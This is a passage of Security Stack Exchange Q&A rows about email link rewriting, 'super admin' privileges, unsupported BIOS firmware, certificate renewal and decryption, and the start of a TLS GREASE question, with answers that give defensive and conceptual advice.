<p>I have tried looking for opinions online, but the only articles I find come from people that are trying to sell similar technology, so they might be biased: for instance <a href=""https://www.darkreading.com/edge-articles/why-secure-email-gateways-rewrite-links-and-why-they-shouldn-t-"" rel=""noreferrer"">this</a>, <a href=""https://www.vadesecure.com/en/blog/rethinking-url-rewriting-in-email-security"" rel=""noreferrer"">this</a> and <a href=""https://www.tessian.com/blog/why-url-rewriting-is-not-effective/"" rel=""noreferrer"">this</a>.</p>
","50","4","264544","<p>This practice actually has a bunch of security downsides that make it problematic.</p>
<p>First, modifying the email breaks any sort of digital signature on it, such as DKIM.  This can be used by the mail server or the mail client to verify that the author is who they say they are.  For example, if your mail client says, &quot;This email is from stackexchange.com,&quot; then you can know that the email may be legitimate if it looks like a StackExchange email, but this can't be done if you modify the email.</p>
<p>Second, it also means that the URL no longer points to the actual domain.  This makes phishing easier, since every illegitimate link looks just like a legitimate link: it goes to some rewritten domain.  If the user is expecting a link to an internal domain, they can no longer determine if the link is legitimate just by looking at the hostname in the URL.</p>
<p>A better practice would be to use some sort of endpoint software or trusted DNS server which logs all domains used or disallows known malicious sites.  This is common in a lot of places and avoids the security downsides of tampering with data.  You can also scan them when they come into the server and look for suspicious looking URLs, such as those which look like some sort of impersonation attack on legitimate domains or those which are known to be associated with malware or phishing.</p>
<p>I also should point out that you should not under any circumstances use a TLS intercepting proxy as Steffen Ulrich suggests.  Security research has found numerous vulnerabilities in these devices, including weak algorithms, insecure protocol versions, and lack of certificate validation, any of which can mean that data can just be decrypted by an attacker.  What's more, they are often just functionally broken and don't speak the protocol correctly, which I can tell you from years of dealing with end user problems as a Git contributor.</p>
","48"
"264533","264533","Is URL rewriting in e-mail a sound security practice?","<p>Our work e-mail server has started rewriting links in incoming mail through a redirecting gateway, for &quot;security reasons&quot;: if I receive an e-mail containing a link to
<code>https://security.stackexchange.com</code>, the link gets rewritten to</p>
<pre><code>https://es.sonicurlprotection-fra.com/click?PV=2&amp;MSGID=202209021358500174760&amp;URLID=1&amp;ESV=10.0.18.7423&amp;IV=D329C6F4AF0738E931FA9F0EAAD309B2&amp;TT=1662127131399&amp;ESN=kgatDRmAwf3NdgkHDeepamZT4x4VYB71UZXeLJNkMQ0%3D&amp;KV=1536961729280&amp;B64_ENCODED_URL=aHR0cHM6Ly9zZWN1cml0eS5zdGFja2V4Y2hhbmdlLmNvbQ&amp;HK=B0A81618C6DD8CBAFF5376A265D02328AB2DA6B2A64AA8DA59F1662AC2089052 
</code></pre>
<p>before the mail arrives into my Inbox. Clicking on this opaque blob redirects me to <code>https://security.stackexchange.com</code>.</p>
<p>Presumably, the idea is that if the target address turns out to be malicious then the mail server provider (Sonicwall) can decide to block the link even retroactively in messages that have already been delivered.</p>
<p>Is this kind of link tracking considered good security practice? Are there any authoritative opinions on it from researchers, for instance?  At a first thought, I can come up with many disadvantages, and minimal advantages (but I am no security expert).</p>
<p>I have tried looking for opinions online, but the only articles I find come from people that are trying to sell similar technology, so they might be biased: for instance <a href=""https://www.darkreading.com/edge-articles/why-secure-email-gateways-rewrite-links-and-why-they-shouldn-t-"" rel=""noreferrer"">this</a>, <a href=""https://www.vadesecure.com/en/blog/rethinking-url-rewriting-in-email-security"" rel=""noreferrer"">this</a> and <a href=""https://www.tessian.com/blog/why-url-rewriting-is-not-effective/"" rel=""noreferrer"">this</a>.</p>
","50","4","264563","<p>This is done by a number of providers; however it has a number of downsides that mean it is often preferable to just scan for bad links rather than modify them.</p>
<ol>
<li>It breaks PGP or SMIME digital signatures.  This is a big one, as it prevents end-to-end verification unless encrypted. DKIM signatures can be validated by your mail gateway before modification, and warning headers added by wrapping a mime-multipart-inline around the signed wrapper, but body modification will definitely break signatures.</li>
<li>It prevents users from visually verifying valid URLs.  You have no way to spot phishing URLs yourself any more, and have passed complete agency to the monitoring software.</li>
<li>It may break use-once URLs.  Some security systems send out use-once URLs to access things.  If this system checks a link by downloading it to check before passing on, it is possible that this can result in a double-retrieval which will prevent the end use from accessing a use-once URL.  I have seen this happen with Sympa (mailing list software)</li>
<li>You would likely get just as good protection by checking for dubious URLs, and adding a Subject tag or mail header (or quarantining the entire email) if something looks suspicious.</li>
</ol>
<p>On the one hand, it is good that some sort of scanning is taking place.  That's better than nothing!  But the way it has been implemented possibly has too many downsides and so I would not call it best practice.  Scanning inbound emails, and checking for suspicious URLs, is definitely best practice but not necessarily making modifications to the incoming email.</p>
","14"
"264533","264533","Is URL rewriting in e-mail a sound security practice?","<p>Our work e-mail server has started rewriting links in incoming mail through a redirecting gateway, for &quot;security reasons&quot;: if I receive an e-mail containing a link to
<code>https://security.stackexchange.com</code>, the link gets rewritten to</p>
<pre><code>https://es.sonicurlprotection-fra.com/click?PV=2&amp;MSGID=202209021358500174760&amp;URLID=1&amp;ESV=10.0.18.7423&amp;IV=D329C6F4AF0738E931FA9F0EAAD309B2&amp;TT=1662127131399&amp;ESN=kgatDRmAwf3NdgkHDeepamZT4x4VYB71UZXeLJNkMQ0%3D&amp;KV=1536961729280&amp;B64_ENCODED_URL=aHR0cHM6Ly9zZWN1cml0eS5zdGFja2V4Y2hhbmdlLmNvbQ&amp;HK=B0A81618C6DD8CBAFF5376A265D02328AB2DA6B2A64AA8DA59F1662AC2089052 
</code></pre>
<p>before the mail arrives into my Inbox. Clicking on this opaque blob redirects me to <code>https://security.stackexchange.com</code>.</p>
<p>Presumably, the idea is that if the target address turns out to be malicious then the mail server provider (Sonicwall) can decide to block the link even retroactively in messages that have already been delivered.</p>
<p>Is this kind of link tracking considered good security practice? Are there any authoritative opinions on it from researchers, for instance?  At a first thought, I can come up with many disadvantages, and minimal advantages (but I am no security expert).</p>
<p>I have tried looking for opinions online, but the only articles I find come from people that are trying to sell similar technology, so they might be biased: for instance <a href=""https://www.darkreading.com/edge-articles/why-secure-email-gateways-rewrite-links-and-why-they-shouldn-t-"" rel=""noreferrer"">this</a>, <a href=""https://www.vadesecure.com/en/blog/rethinking-url-rewriting-in-email-security"" rel=""noreferrer"">this</a> and <a href=""https://www.tessian.com/blog/why-url-rewriting-is-not-effective/"" rel=""noreferrer"">this</a>.</p>
","50","4","264588","<p>This is a profoundly annoying practice. Especially if the rewriting rules are misconfigured to rewrite URLs sent to parties that have no means to reach the redirecting server.</p>
<p>Good luck configuring it correctly in a complex corporate setup.</p>
<p>In relation to security, if a security feature is preventing people from doing their work, they either find workarounds (with much worse security implications) or just stop doing at least some of their work.</p>
<p>Other answers mentioned a great deal of other problems of this security approach, so one can conclude that this &quot;solution&quot; goes somewhere in the range between:</p>
<ul>
<li>&quot;Security theater&quot;-type solution</li>
<li>&quot;Not our fault&quot;-type solution, where people responsible for security are forcing others to use less secure, unofficial practices (e.g. external mail providers) in order to blame these unofficial practices for breaches when the breaches occur.</li>
</ul>
","3"
"264479","264479","Is it bad practice to have a 'super admin' - so they effectively bypass security checks in your system?","<p>I have seen a few system designs in my time and one question keeps cropping up:</p>
<p>Is it bad practice to have 'super admin' - single user - or 'super admin' privileges in your system?</p>
<p>By that I mean giving one or many users 'super admin' privileges so they basically never see a &quot;you do not have permission&quot; error and are never prevented from doing anything in the system.</p>
<p>This is from a security standpoint mainly - If someone somehow managed to login to an account that has 'super admin' privileges (when they shouldn't have access) they could wreak havoc as they can change anything in the system</p>
","18","4","264481","<p>You've confused a few different topics into one:</p>
<ul>
<li>is it bad practice to have the permission set?</li>
<li>is it bad practice to assign the permission set to an active user?</li>
<li>is it bad practice to have weak controls on the reserved user with super-admin permissions?</li>
</ul>
<p>Of course it is not bad practice to have the permission set if the system requires it. Unix/Linux has had the &quot;root&quot; user for decades. So, the existence of the permission set is not an issue.</p>
<p>Multiple standards, regulations, and advice beg people not to assign super-user permissions to a normal active user. Active normal users tend to interact with untrusted data and code, which is open to compromise. This is why there is an open debate about developers having local admin permissions. They need it (#1), but it is a massive exposure (#2).</p>
<p>Which brings us to your third point, which becomes self-answerable. Because you should not have super-user permissions on a <strong>normal</strong> user, then you should also have increased protections on that account, since your whole point is to protect it from compromise. In other words, make it impossible for a non-authorised person to log in with that permission set. So, the security of the system is extended to the security of the account.</p>
","16"
"264479","264479","Is it bad practice to have a 'super admin' - so they effectively bypass security checks in your system?","<p>I have seen a few system designs in my time and one question keeps cropping up:</p>
<p>Is it bad practice to have 'super admin' - single user - or 'super admin' privileges in your system?</p>
<p>By that I mean giving one or many users 'super admin' privileges so they basically never see a &quot;you do not have permission&quot; error and are never prevented from doing anything in the system.</p>
<p>This is from a security standpoint mainly - If someone somehow managed to login to an account that has 'super admin' privileges (when they shouldn't have access) they could wreak havoc as they can change anything in the system</p>
","18","4","264483","<p>I would split my answer into two parts:</p>
<h2>Super admin in general</h2>
<p>When designing a system, you do not want to get into a situation where no one is able to access the system and manage it as needed, especially when an emergency is at hand.</p>
<p>On the other hand, you probably don't want a single entity to be able to manage and control all properties of the said system.</p>
<p>For this particular reason, many designs include this role but with a limited assignment.<br />
This role is mostly assigned to either &quot;non-personal&quot; user account that its credentials are safeguarded by a quorum of trusted people.<br />
Another option is to have this role assigned to multiple trusted users with an approval quorum to apply sensitive modifications.</p>
<p>Sometimes similar account is also created as a local account (in case the others are governed by an organization's centralized identity management platform such as Okta) to allow out-of-band access in case of emergencies.</p>
<h2>Users assuming super administrative privileges at all times</h2>
<p>Per security design principles, you want to avoid excessive privileges assigned to personnel.<br />
Your system should support access packages and roles to bind for the specific actions they need to perform over your system.<br />
Let them perform whatever operations they need, nothing else.</p>
<p>It doesn't necessarily mean you are giving them the key to your castle if they are system administrators.
You can put senstive operations under additional security measures such as just-in-time access with an external supervisor to allow the grant, etc.</p>
","22"
"264479","264479","Is it bad practice to have a 'super admin' - so they effectively bypass security checks in your system?","<p>I have seen a few system designs in my time and one question keeps cropping up:</p>
<p>Is it bad practice to have 'super admin' - single user - or 'super admin' privileges in your system?</p>
<p>By that I mean giving one or many users 'super admin' privileges so they basically never see a &quot;you do not have permission&quot; error and are never prevented from doing anything in the system.</p>
<p>This is from a security standpoint mainly - If someone somehow managed to login to an account that has 'super admin' privileges (when they shouldn't have access) they could wreak havoc as they can change anything in the system</p>
","18","4","264508","<p>As a general rule, having some sort of all-powerful role (or user) is probably poor design. However, practicalities should be taken into account.</p>
<p>The <code>root</code> user on a Linux system is all-powerful <em>on that server</em>. They can do absolutely anything - read/modify the RAM or files in use, or shutdown the server or anything else. You could well argue they're a &quot;super admin&quot;, and we do generally refer to the <code>root</code> user as a <strong>super user</strong>.</p>
<p>However, that <code>root</code> user cannot do anything to other servers, or the network infrastructure or anything else &quot;outside&quot; the server in question. Thus, they're not a &quot;super admin&quot; of the whole system - just of that one server. This is an example of segmented access - which is absolutely something that a new systems design should incorporate.</p>
<p>The principle at play here is to allow a human to do the work they need to do (especially in an emergency), but not to allow the human to do <em>more</em> than that. If there's a problem with Server1, then they can do whatever they need to fix Server1, but can't go and mess with Server2 (to work on Server2, they'd have to authenticate again, and separately with Server2). The point being that just because they somehow got the credentials to log on as the super user on Server1 doesn't immediately give them the ability to do it on Server2 - so they can't accidentally do something to Server2, and nor can a hacker use one point of entry to move &quot;sideways&quot; into other areas of the system.</p>
<p>Moving on to non-emergency situations, you have to allow administrators (and users) to work on the system. For that, you'd ideally want to give them a reduced set of permissions, so they're not a &quot;<code>root</code>&quot; type super user anywhere, but can still perform the likely maintenance and other activities that they need to do. This is generally called the Principle of Least Privilege, where you give people just enough permissions to do their work, but nothing more than that (and ideally no where near enough to do any damage).</p>
<p>Assuming an administrator is using their least-privilege credentials/account, then they can do their normal job. However, if a non-normal task comes along (like an emergency, or a special request), then they can (temporarily) elevate themselves to a higher level of privilege (perhaps a super user). This &quot;elevation&quot; step should be an explicit action so that it's something they must have deliberately done, and couldn't have done accidentally (you probably want to log that it's taken place too, so you have an audit). The point here being that if they go on to do something bad, they can't claim it was an accident, or their finger slipped or whatever. When they've finished the special task, they should go back to their normal (restricted) level of permissions. To that end, some &quot;privilege elevations&quot; are time limited so you have to keep renewing them if you want to stay in the higher level - as a means to avoid having people stay at higher privilege indefinitely.</p>
","10"
"264479","264479","Is it bad practice to have a 'super admin' - so they effectively bypass security checks in your system?","<p>I have seen a few system designs in my time and one question keeps cropping up:</p>
<p>Is it bad practice to have 'super admin' - single user - or 'super admin' privileges in your system?</p>
<p>By that I mean giving one or many users 'super admin' privileges so they basically never see a &quot;you do not have permission&quot; error and are never prevented from doing anything in the system.</p>
<p>This is from a security standpoint mainly - If someone somehow managed to login to an account that has 'super admin' privileges (when they shouldn't have access) they could wreak havoc as they can change anything in the system</p>
","18","4","264514","<p>OSes in common use all have such &quot;super admin&quot; capabilities. Clearly, the regular user does not have such privileges and even the administrative user(s) should minimize their use of escalated privilege. This principle is called &quot;least privilege&quot; and some of the other answers cover it in detail. Minimizing privilege use is obviously a &quot;best practice&quot; for the security conscious administrator.</p>
<p>However, even following these best practices does not eliminate the presence of the &quot;super admin&quot; capability. This capability <strong>is</strong> removed in high security specialized operating systems with a practice called &quot;two person control.&quot; Typically, admin accounts have all the normal privileges one associates with them now, but a separate security admin account also exists. Regular admin accounts make security-sensitive privilege changes <strong>BUT</strong> those changes do not go into effect until approved by a security admin account. A security admin account cannot make privilege or ownership changes, but only approve or disapprove changes made by a regular admin. By restricting those roles to different people, you prevent a single person from having the &quot;super admin&quot; capability.</p>
","1"
"264349","264349","What are the security implications of using an old computer with no more BIOS updates?","<p>What are potential security implications of using older unsupported motherboards/laptops that do not get BIOS(UEFI) updates anymore, but run an up to date GNU/Linux distribution?
Do measures like using secure boot or setting up a BIOS password help mitigate any of the potential threats?</p>
","3","3","264354","<p>SoHo PCs/laptops: no threat whatsoever aside from physical but updates or no updates will not help you deal with this. For normal devices BIOS/EFI should have zero network attack vectors if your software is updated, secure and set up properly.</p>
<p>Corporate managed workstations: Intel ME and AMD PSP have seen quite a large number of vulnerabilities, including remote ones but corporations should have strict LAN access policies which should mitigate that.</p>
<blockquote>
<p>Do measures like using secure boot or setting up a BIOS password help mitigate any of the potential threats?</p>
</blockquote>
<p>For an attacker with physical access it's nearly completely useless unless you also use full disk encryption and TPM. Even if both are used, the attacked may implant something, including a hardware keylogger and all the protections are bust.</p>
<p>Secure boot in case of Linux <em>only</em> allows to make sure your boot loader, kernel and its modules are signed. The Linux kernel will then happily run everything and anything, so if your userspace is compromised one way or another, secure boot and BIOS password won't make any difference.</p>
<p>Windows is secured much better because absolute most Windows userspace components (binaries and shared libraries) are digitally signed, so you can be sure that the entire boot chain is verified. Even in this case there are multiple ways to have the system pertinently infected with malware which can use CMD, PowerShell, VBS, etc. scripts to run and those can be stored in a ton of places including the registry, Windows Task Scheduler and many others. Hackers find new ways to store malware in Windows without touching any normal files all the time.</p>
","-1"
"264349","264349","What are the security implications of using an old computer with no more BIOS updates?","<p>What are potential security implications of using older unsupported motherboards/laptops that do not get BIOS(UEFI) updates anymore, but run an up to date GNU/Linux distribution?
Do measures like using secure boot or setting up a BIOS password help mitigate any of the potential threats?</p>
","3","3","264356","<p>Once the machine is booted, the bios has no involvement in the system (except for TPM), so in general, there are no security implications for lack of bios updates after boot.</p>
<p>However, if there are bugs in the secure boot and tpm path itself, then there may be ways to hack the machine before or during boot.  In some cases, this is a serious problem, but in many cases, it's fairly irrelevant.  Obviously, if there are bugs in secure boot, secure boot isn't going to mitigate the issue well.</p>
<p>The exception to this is (mostly enterprise level) machines with a base board management controller that runs independent from the rest of the system.  If there are bugs in that firmware, the boot state of the machine is not relevant.  Bugs in the BMC network stack can be a huge problem, but in general the BMC should be on a protected network anyway.  Bugs there could even affect availability rather than integrity, as the BMC monitors system temperatures and adjusts fan speeds, so a bug there could cause the machine to burn out or fail prematurely.  (I have seen multiple bios/firmware updates to fix BMC fan speeds on multiple platforms and architectures, and even had some machines burn out due to this; it's a real issue.)</p>
","0"
"264349","264349","What are the security implications of using an old computer with no more BIOS updates?","<p>What are potential security implications of using older unsupported motherboards/laptops that do not get BIOS(UEFI) updates anymore, but run an up to date GNU/Linux distribution?
Do measures like using secure boot or setting up a BIOS password help mitigate any of the potential threats?</p>
","3","3","264357","<p><strong>Most</strong> security vulnerabilities that can be mitigated by firmware are either microarchitectural side-channel attacks (such as the Spectre class of vulnerabilities), or issues that can only be exploited from a superuser context. In most threat models, an exploited superuser is game over.</p>
<p>Secure Boot can help prevent malware persistence, and a BIOS password makes the computer a bit more secure in the hands of a non-motivated and non-sophisticated physical attacker. None of those help mitigate the kinds of issues that can be caused by outdated firmware.</p>
<hr />
<p>Sometimes vulnerabilities are discovered that can be mitigated by setting MSRs (Model-Specific Registers) or tweaking certain &quot;chicken bits&quot; in the microcode. While it is true that the UEFI does not have much to do with the running system beyond SMM (System Management Mode), it is not entirely true that outdated firmware has <em>no</em> security implications. You can use the popular <a href=""https://github.com/chipsec/chipsec"" rel=""nofollow noreferrer"">CHIPSEC</a> framework to check for <a href=""https://github.com/chipsec/chipsec/wiki/Vulnerabilities-and-CHIPSEC-Modules"" rel=""nofollow noreferrer"">security vulnerabilities</a>. They have a <a href=""https://github.com/chipsec/chipsec/blob/master/chipsec-manual.pdf"" rel=""nofollow noreferrer"">very detailed manual</a> explaining how to use their modules. The framework is described on their GitHub page:</p>
<blockquote>
<p>CHIPSEC is a framework for analyzing the security of PC platforms including hardware, system firmware (BIOS/UEFI), and platform components. It includes a security test suite, tools for accessing various low level interfaces, and forensic capabilities. It can be run on Windows, Linux, Mac OS X and UEFI shell.</p>
</blockquote>
<p>CHIPSEC can alert you to various security issues in your firmware. In some cases, although not all, only updating the firmware can mitigate them. You might be surprised at how many issues your old computer has that cannot be reasonably mitigated if the firmware cannot be updated.</p>
","3"
"264274","264274","Encryption certs protected from decryption by thumbprint","<p>Is it true that you can only decrypt data that was encrypted by a certificate using the same exact thumbprint? My thought was that you can decrypt the data using an updated version of the same certificate with just an expiration date that's further into the future. This certificate will have a different thumbprint, but everything else remains the same (e.g., SubjectName, SAN, etc.)</p>
<p>Wouldn't I still be able to decrypt the same data using both certs? Someone told me that I can only decrypt the data by the older certificate. Trying to decrypt the data (that was encrypted with the older certificate) using the new certificate wouldn't work. Am I missing something? If this were true, wouldn't it wreck havoc anytime an encryption certificate were to expire? Someone would renew the encryption certificate and find out that they couldn't decrypt any of the data that was encrypted by the old certificate.</p>
<p><em>Edit</em>
The scenario is that a self-signed certificate, which includes a private key, is used to encrypt data using the public key portion, and is also used to decrypt data using the private key. As others have pointed out, folks here want to be very specific to say it's not the certificate that encrypts data. That's fine, we don't really specify it to that level in my team as everyone knows we're implying the public key encrypts and private key from the certificate decrypts the data, but I now remember how specific folks get on forums. Anyhow, we have a certificate that's encrypting data and also decrypting data. The self-signed cert seems like a very bad idea. My suggestion was to avoid using a self-signed certificate altogether as I could create a certificate that has the same SubjectName as the target certificate. My thought was, can the private key from a self-signed certificate with the same SubjectName be used to decrypt the data? The person that I spoke to explained that once the self-signed certificate is renewed, then it cannot decrypt data that was encrypted using the older self-signed certificate (that has the same SubjectName).</p>
","0","3","264276","<p>A certificate doesn't encrypt data, and definitely doesn't decrypt it.</p>
<ol>
<li>A certificate contains a public key, and that public key can be used to encrypt data.</li>
<li>That public key was created using a private key, and together they form a key pair.</li>
<li>The private key can be used to decrypt a message that was encrypted using the public key.</li>
<li>The private key is <strong>not</strong> a part of the certificate. If it was, anyone who has access to the certificate (which is typically public) could decrypt the messages.</li>
<li>When updating a certificate, you typically generate a new key pair.</li>
<li>This means if I use the public key in a certificate to encrypt a message, decrypting it would require the private key that created it, which is not the same as the private key used to create the updated certificate.</li>
</ol>
","2"
"264274","264274","Encryption certs protected from decryption by thumbprint","<p>Is it true that you can only decrypt data that was encrypted by a certificate using the same exact thumbprint? My thought was that you can decrypt the data using an updated version of the same certificate with just an expiration date that's further into the future. This certificate will have a different thumbprint, but everything else remains the same (e.g., SubjectName, SAN, etc.)</p>
<p>Wouldn't I still be able to decrypt the same data using both certs? Someone told me that I can only decrypt the data by the older certificate. Trying to decrypt the data (that was encrypted with the older certificate) using the new certificate wouldn't work. Am I missing something? If this were true, wouldn't it wreck havoc anytime an encryption certificate were to expire? Someone would renew the encryption certificate and find out that they couldn't decrypt any of the data that was encrypted by the old certificate.</p>
<p><em>Edit</em>
The scenario is that a self-signed certificate, which includes a private key, is used to encrypt data using the public key portion, and is also used to decrypt data using the private key. As others have pointed out, folks here want to be very specific to say it's not the certificate that encrypts data. That's fine, we don't really specify it to that level in my team as everyone knows we're implying the public key encrypts and private key from the certificate decrypts the data, but I now remember how specific folks get on forums. Anyhow, we have a certificate that's encrypting data and also decrypting data. The self-signed cert seems like a very bad idea. My suggestion was to avoid using a self-signed certificate altogether as I could create a certificate that has the same SubjectName as the target certificate. My thought was, can the private key from a self-signed certificate with the same SubjectName be used to decrypt the data? The person that I spoke to explained that once the self-signed certificate is renewed, then it cannot decrypt data that was encrypted using the older self-signed certificate (that has the same SubjectName).</p>
","0","3","264285","<p><strong>Semantics do matter here.</strong> Even though you don't <em>&quot;specify it to that level&quot;</em> in your team, you are on Security SE, and I would advise you to be very careful when handling the public key/certificate versus the private key. This implies using proper terminology when working with them. (Imagine someone sending the &quot;certificate&quot; including the private key to an external 3rd party!)</p>
<p><strong>Public key, private key, certificate, and fingerprint</strong></p>
<p>Simplified, the <em>public</em> and <em>private keys</em> are 2 pieces of data that are bound by cryptographic properties: what one could encrypt, the other could decrypt. But while the former will be shared <em>publicly</em>, the latter has to be kept secured.</p>
<p>The <em>certificate</em> is here, well, to <em>certify</em> a public key. Basically, the certificate is a public key with additional information to ensure its validity: who owns it, what it can do, the validity time frame, etc. and of course the whole thing is protected with a fingerprint. That <em>fingerprint</em> ensures that the previous information were not modified by an illegitimate third party.</p>
<p><strong>If it expires, can it still be used?</strong></p>
<p><em>The certificate is here to provide trust</em> and part of the technical mechanism is the fingerprint. However, nothing prevents you to use the embedded public key, even if the certificate is invalid. This includes expired certificate. This include if someone changed the CN and let the fingerprint wrong.</p>
<p>So you can still use the public key to verify signatures generated with the private key. Alternatively, you can still use the private key to decrypt data encrypted with the public key. They did not suddenly change.</p>
<p><strong>What about certificate renewal?</strong></p>
<p>It depends what you mean by certificate renewal. From what I am guessing with you using self-signed certificate, you may be generating a new key pair every time. You have to check that.</p>
<p><strong>If you renew the key pair</strong> (private &amp; public keys), <strong>then yes, you will need the old key pair.</strong></p>
<p><strong>If you did not change the key pair</strong> and used it to renew your certificate, then <strong>the new one will work just as fine as the old one<sup>1</sup></strong>, simply because what's being fed to the cryptographic functions did not change<sup>2</sup>. When you renew your id, you do not change, you just get some authority to stamp a new document stating you are indeed who you pretend to be for the next <em>x</em> years.</p>
<hr />
<p><sup><sup>1</sup>: the old one will probably be refused by the clients due to its expired status, but one could technically bypass it and still use the embedded public key.</sup></p>
<p><sup><sup>2</sup>: The fingerprint on the certificate will be different, indeed, simply because the certificate is different (e.g, the validity time frame), but that's just something someone can use to verify the certificate (trust), it does not participate in the decryption/encryption process.</sup></p>
","5"
"264274","264274","Encryption certs protected from decryption by thumbprint","<p>Is it true that you can only decrypt data that was encrypted by a certificate using the same exact thumbprint? My thought was that you can decrypt the data using an updated version of the same certificate with just an expiration date that's further into the future. This certificate will have a different thumbprint, but everything else remains the same (e.g., SubjectName, SAN, etc.)</p>
<p>Wouldn't I still be able to decrypt the same data using both certs? Someone told me that I can only decrypt the data by the older certificate. Trying to decrypt the data (that was encrypted with the older certificate) using the new certificate wouldn't work. Am I missing something? If this were true, wouldn't it wreck havoc anytime an encryption certificate were to expire? Someone would renew the encryption certificate and find out that they couldn't decrypt any of the data that was encrypted by the old certificate.</p>
<p><em>Edit</em>
The scenario is that a self-signed certificate, which includes a private key, is used to encrypt data using the public key portion, and is also used to decrypt data using the private key. As others have pointed out, folks here want to be very specific to say it's not the certificate that encrypts data. That's fine, we don't really specify it to that level in my team as everyone knows we're implying the public key encrypts and private key from the certificate decrypts the data, but I now remember how specific folks get on forums. Anyhow, we have a certificate that's encrypting data and also decrypting data. The self-signed cert seems like a very bad idea. My suggestion was to avoid using a self-signed certificate altogether as I could create a certificate that has the same SubjectName as the target certificate. My thought was, can the private key from a self-signed certificate with the same SubjectName be used to decrypt the data? The person that I spoke to explained that once the self-signed certificate is renewed, then it cannot decrypt data that was encrypted using the older self-signed certificate (that has the same SubjectName).</p>
","0","3","264286","<blockquote>
<p>Is it true that you can only decrypt data that was encrypted by a certificate using the same exact thumbprint?</p>
</blockquote>
<p>This question doesn't really make sense, which is I think the source of the confusion. <strong>You don't decrypt data with a certificate.</strong> You don't even <em>encrypt</em> data with one, but at least there, there's an obvious missing step: you <em>can</em> encrypt data with the public key <em>from</em> a certificate (sometimes, if the public key is a kind that supports encryption, which in practice mostly means RSA these days). There's no such obvious step for (asymmetric) decryption, because a certificate does not include a private key (not even a self-signed certificate!). The closest you can get is:</p>
<blockquote>
<p>Is it true that you can only decrypt data using the private key that is the counterpart of the public key used for encryption?</p>
</blockquote>
<p>Which is true, but that's very elementary and unsurprising. However:</p>
<ul>
<li>having a certificate does not imply having a private key</li>
<li>having a private key does not imply having a certificate</li>
<li>multiple certificates can use the same public key</li>
</ul>
<p>The certificate per se has nothing to do with either encryption or decryption, aside from being a place you can find the public key and the identity of the private key's holder.</p>
<hr />
<p>With that said, hopefully the rest of this follows clearly to you:</p>
<blockquote>
<p>My thought was that you can decrypt the data using an updated version of the same certificate with just an expiration date that's further into the future. This certificate will have a different thumbprint, but everything else remains the same (e.g., SubjectName, SAN, etc.)</p>
</blockquote>
<p>Those things (expiration date, subject name, etc.) are part of the certificate but not the private key, and therefore irrelevant to decryption (and encryption, but especially decryption).</p>
<blockquote>
<p>Someone told me that I can only decrypt the data by the older certificate. Trying to decrypt the data (that was encrypted with the older certificate) using the new certificate wouldn't work.</p>
</blockquote>
<p>This person is even more confused than you are, and you should probably not trust anything they have to say about cryptography. <strong>If you still have the private key corresponding to the public key that was used to encrypt the data, you can decrypt the data. If you don't, you can't.</strong> It does not matter whether the public key is now, ever was, or will ever be in zero, one, or many certificates, whether the certificate[s] expired or not, whether a certificate has been re-issued or otherwise updated, etc.</p>
<blockquote>
<p>The scenario is that a self-signed certificate, which includes a private key</p>
</blockquote>
<p>No it doesn't. You might have a single file that contains both a certificate and a private key, but they aren't the same thing. Copying the Gettysburg Address and a picture of a dog into the same document does not mean that the Gettysburg Address contains a picture of a dog, even if you save the file as &quot;Gettysburg Address.docx&quot; with the picture of the dog still in there. Like the Gettysburg Address, a certificate is a specific and specifically-organized collection of data; it can be stored in a file, but it is wrong to say that the file <em>is</em> the certificate, only that the file might <em>contain</em> the certificate (and other things, like <em>potentially</em> the private key corresponding to the public key in the certificate).</p>
<p>This might sound pedantic to you, but this kind of precise thinking is essential in security (or really, in any kind of technical discussion, but the failure is perhaps most devastating when it is missing from security). You can say &quot;everyone knows we're implying the public key encrypts and private key from the certificate decrypts the data&quot; but the degree of incorrect assumptions about the entire cryptosystem implied by that statement make me concerned about the security of your software in general. As for &quot;I now remember how specific folks get on forums&quot;, I wouldn't accept a technical specification that wasn't clear whether the code was supposed to accept/supply a string, a BigNumber object, a ByteArray, an X509Certificate object, a KeyPair object, a PublicKey object, an opaque handle, or some other way of representing a cert and/or public key - <em>all of those could refer to the same key, some in several different ways</em> - and neither should you. In technical discussions, rigor is important, and sloppy language leads to misunderstandings and errors</p>
<blockquote>
<p>The self-signed cert seems like a very bad idea.</p>
</blockquote>
<p>Not really relevant to the question, but: why? The danger of self-signed certs is that if you get one from somebody else, you have to take them at their word that the key it contains belongs to who the cert (or the person handing it to you) says it does. That's it. I expect that concern is totally irrelevant to this scenario.</p>
<blockquote>
<p>My thought was, can the private key from a self-signed certificate with the same SubjectName be used to decrypt the data?</p>
</blockquote>
<p>If it's the private key corresponding to the public key - not the certificate - used for encryption, yes. If not, no. The SubjectName - like all the other parts of the certificate that aren't its public key - is completely irrelevant.</p>
<blockquote>
<p>The person that I spoke to explained that once the self-signed certificate is renewed, then it cannot decrypt data that was encrypted using the older self-signed certificate (that has the same SubjectName).</p>
</blockquote>
<p>Again, this person is deeply confused about the very nature of certificates and asymmetric cryptography. &quot;Renewing&quot; a certificate is a matter of bookkeeping, nothing more or less; you are simply updating a record somewhere of what the current certificate is. The old certificate doesn't go away (unless you delete all available copies of it). The old private key <em>definitely</em> doesn't go away, whether or not the new certificate uses the same public key as the old one, unless you delete that too. Obviously if you generate a new key pair, and then a new certificate with that new keypair, and then delete the old keypair (and optionally the old certificate too), then of course you can't decrypt data encrypted with the old public key... but that has nothing to do with the certificate (either one), and everything to do with having deleted <em>specifically</em> the old private key. If you use the existing keypair to generate a completely new certificate indicating that it is valid from 2378 until 40000 BCE and containing &quot;Bob's left-most eyebrow hair&quot; as the subject CN, and replace the old cert with that one... well, you might confuse some libraries that attempt to validate the certificate, or that attempt to find it by the old CN, but the private key will still work for decrypting data encrypted using the public key from the old certificate.</p>
","3"
"264198","264198","TLS 1.3 - GREASE - What if Middleboxes are updated to simply ignore GREASE values? Doesn't the problem GREASE is trying to fix still exist?","<p>Various ambiguous &quot;middleboxes&quot; exist at arbitrary points throughout the Internet between a Client and Server's TLS connection.</p>
<p>A possible intent of these middleboxes is to enforce protocol standards, which sounds great in theory but hinders quick adoption when updating to new versions of a protocol -- as is what happened during the migration to TLS 1.3 from TLS 1.2 and prior.</p>
<p>A solution (well, deterrent) to this happening again in the future is the <strong>GREASE</strong> protocol specified by <a href=""https://www.rfc-editor.org/rfc/rfc8701.html"" rel=""nofollow noreferrer"">RFC 8701</a> (Applying <strong>G</strong>enerate <strong>R</strong>andom <strong>E</strong>xtensions <strong>A</strong>nd <strong>S</strong>ustain <strong>E</strong>xtensibility TLS Extensibility).</p>
